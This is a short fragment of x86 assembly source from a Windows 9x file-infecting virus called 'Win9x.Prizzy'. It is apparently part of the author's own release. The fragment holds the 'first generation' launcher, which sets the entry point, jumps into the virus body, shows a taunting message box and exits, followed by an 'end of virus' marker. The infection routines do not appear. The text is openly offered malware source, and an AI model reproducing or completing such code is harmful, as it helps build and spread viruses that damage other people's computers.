   ;ÄÄÄ´ first generation ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   first_generation:

           ; after installing, run it above
           mov dword ptr [original_ep], \
               offset __fg_run_this - offset virus_start
           jmp virus_start

       __fg_run_this:
           ; display a simple message box
           push    MB_OK
           @pushsz "Win9x.Prizzy - welcome to my world..."
           @pushsz "First generation sample"
           push    0
           call    MessageBoxA

           ; exit program - haha huahaha <program> :))
           push    0
           call    ExitProcess

   ;ÄÄÄ´ end of virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   end first_generation
